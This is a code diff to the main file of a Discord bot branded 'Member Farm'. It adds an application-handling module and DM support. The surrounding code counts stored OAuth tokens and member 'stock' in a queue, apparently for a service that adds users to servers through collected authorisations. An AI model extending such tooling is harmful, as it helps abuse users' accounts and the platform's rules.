@@ -1,11 +1,12 @@
 // language: JavaScript, file: index.js
 require('dotenv').config();
-const { Client, GatewayIntentBits, Partials, Events, EmbedBuilder, PermissionFlagsBits } = require('discord.js');
+const { Client, GatewayIntentBits, Partials, Events, EmbedBuilder } = require('discord.js');
 const { init, one, many, query, getSetting } = require('./db');
 const { createOAuthServer } = require('./oauth');
 const { handleCommand } = require('./commands');
 const logs = require('./logs');
 const queue = require('./queue');
+const apply = require('./apply');
 const config = require('./config');
 
 if (!process.env.BOT_TOKEN) {
@@ -23,6 +24,7 @@ const client = new Client({
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.GuildMembers,
+    GatewayIntentBits.DirectMessages,
   ],
   partials: [Partials.Channel],
 });
@@ -54,7 +56,7 @@ async function isAntiLeave(guildId) {
     let inviterTag = null;
     try {
       const logsAudit = await guild.fetchAuditLogs({
-        type: 28, // BOT_ADD
+        type: 28,
         limit: 5,
       }).catch(() => null);
       const entry = logsAudit?.entries?.find(
@@ -90,16 +92,19 @@ async function isAntiLeave(guildId) {
   });
 
   client.on(Events.MessageCreate, async (message) => {
-    // user banfarm gate
     if (message.author && !message.author.bot) {
       const bl = await one('SELECT reason FROM user_blacklist WHERE user_id = $1', [message.author.id]);
       if (bl) {
         const prefix = (await getSetting('prefix', config.DEFAULT_PREFIX)) || config.DEFAULT_PREFIX;
         if (message.content.startsWith(prefix)) {
-          // silent block except owner
           if (String(message.author.id) !== String(config.OWNER_ID)) return;
         }
       }
+    }
+    try {
+      if (await apply.handleApplyMessage(message, client)) return;
+    } catch (e) {
+      console.error('apply message', e.message);
     }
     await handleCommand(message, client);
   });
@@ -107,7 +112,12 @@ async function isAntiLeave(guildId) {
   client.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isButton()) return;
 
-    // panel live buttons
+    try {
+      if (await apply.handleApplyButton(interaction, client)) return;
+    } catch (e) {
+      console.error('apply button', e.message);
+    }
+
     if (interaction.customId === 'panel_stock') {
       const count = (await one(
         'SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1'
@@ -127,7 +137,7 @@ async function isAntiLeave(guildId) {
         'SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1'
       ))?.c || 0;
       const tokens = (await one('SELECT COUNT(*)::int AS c FROM tokens WHERE valid = 1'))?.c || 0;
-      const qC = (await one(`SELECT COUNT(*)::int AS c FROM queue WHERE status = 'pending'`))?.c || 0;
+      const qC = await one(`SELECT COUNT(*)::int AS c FROM queue WHERE status = 'pending'`);
       const paused = await queue.isPaused();
       return interaction.reply({
         embeds: [new EmbedBuilder().setTitle('Status').setColor(0x57f287).addFields(
@@ -136,7 +146,7 @@ async function isAntiLeave(guildId) {
           { name: 'Guilds', value: '`' + client.guilds.cache.size + '`', inline: true },
           { name: 'Auths', value: '`' + tokens + '`', inline: true },
           { name: 'Stock', value: '`' + stock + '`', inline: true },
-          { name: 'Queue', value: '`' + qC + '`' + (paused ? ' PAUSED' : ''), inline: true }
+          { name: 'Queue', value: '`' + (qC?.c || 0) + '`' + (paused ? ' PAUSED' : ''), inline: true }
         ).setFooter({ text: 'Member Farm' }).setTimestamp()],
         ephemeral: true,
       });
